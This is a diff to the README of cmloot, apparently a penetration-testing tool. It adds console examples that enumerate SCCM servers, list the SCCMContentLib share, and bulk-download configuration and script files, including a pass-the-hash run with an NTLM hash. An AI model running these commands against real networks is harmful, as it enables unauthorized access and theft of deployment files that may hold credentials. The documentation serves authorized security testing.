@@ -4,13 +4,95 @@ For more information refer to https://www.shelltrail.com/research/cmloot/
 
 ## Examples
 
+```console
+user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@not_needed -findsccmservers
+Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra
+
+[+] Found 2 SCCM targets. (Written to ./sccmhosts.txt)
+
+user@adpen1:~/cmloot$ head sccmhosts.txt
+SCCM01.TEST.LOCAL
+SCCM02.TEST.LOCAL
+```
+
+Create cmloot inventory for specific host (sccm01):
+
+```console
+user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootinventory sccmfiles.txt
+Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra
+
+[+] Access to SCCMContentLib on sccm01 
+[+] sccmfiles.txt created
+
+user@adpen1:~/cmloot$ head sccmfiles.txt 
+\\sccm01\SCCMContentLib$\DataLib\XYZ00001.1\amd64\cmi2migxml.dll
+\\sccm01\SCCMContentLib$\DataLib\XYZ00001.1\amd64\Config_AppsAndSettings.xml
+[...]
+```
+
+Create cmloot inventory for multiple hosts:
+
+```console
+user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@not_needed -target-file sccmhosts.txt
+Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra
+
+[+] Found 2 SCCM targets in sccmhosts.txt
+[+] Using target SCCM01.TEST.LOCAL
+[+] Access to SCCMContentLib on SCCM01.TEST.LOCAL
+[+] sccmfiles.txt created, sorted and uniqed
+[+] Using target SCCM02.TEST.LOCAL
+[+] sccmfiles.txt exists. Appending to it.
+[+] Access to SCCMContentLib on SCCM02.TEST.LOCAL
+[+] sccmfiles.txt created, sorted and uniqed
+```
+
+Enumerate, build inventory and download:
+
+```console
+user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@not_needed -findsccmservers -target-file sccmhosts.txt -cmlootdownload sccmfiles.txt 
+Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra
+
+[+] Found 2 SCCM targets. ( Written to ./sccmhosts.txt )
+
+[+] Found 2 SCCM targets in sccmhosts.txt
+[+] Using target SCCM01.TEST.LOCAL
+[+] sccmfiles.txt exists. Appending to it.
+[+] Access to SCCMContentLib on SCCM01.TEST.LOCAL
+[+] sccmfiles.txt created, sorted and uniqed
+[+] Extensions to download ['XML', 'INI', 'CONFIG']
+[+] Creating CMLootOut
+[+] Downloaded D204-Config_AppsAndSettings.xml
+[+] Downloaded 32AF-Config_AppsOnly.xml
+[+] Downloaded B852-Config_SettingsOnly.xml
+[+] Downloaded C7F4-MigApp.xml
+[+] Downloaded CF90-MigDocs.xml
+[+] Downloaded E67A-MigUser.xml
+[+] Downloaded F906-ep_defaultpolicy.xml
+[+] Using target SCCM02.TEST.LOCAL
+[+] sccmfiles.txt exists. Appending to it.
+[+] Access to SCCMContentLib on SCCM02.TEST.LOCAL
+[+] sccmfiles.txt created, sorted and uniqed
+[+] Extensions to download ['XML', 'INI', 'CONFIG']
+[+] Already downloaded D204-Config_AppsAndSettings.xml
+[+] Already downloaded 32AF-Config_AppsOnly.xml
+[+] Already downloaded B852-Config_SettingsOnly.xml
+[+] Already downloaded C7F4-MigApp.xml
+[+] Already downloaded CF90-MigDocs.xml
+[+] Already downloaded E67A-MigUser.xml
+[+] Already downloaded F906-ep_defaultpolicy.xml
+
+user@adpen1:~/cmloot$ ls CMLootOut/
+32AF-Config_AppsOnly.xml  B852-Config_SettingsOnly.xml
+[...]
+```
+
 Pass-the-hash with a user account:
 
 ```console
-user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootdownload sccmfiles.txt -extensions CAB -hashes 0:981f69b7d59d4cc73d1ee05b98981e9c
+user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootdownload sccmfiles.txt -extensions CAB CONF PS1 -hashes 0:981f69b7d59d4cc73d1ee05b98981e9c
 Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
 
-[+] Extensions to download ['CAB']
+[+] Extensions to download ['CAB','CONF','PS1']
 [+] Downloaded 1A6D-ccmsetup.cab
 [+] Downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab
 ```
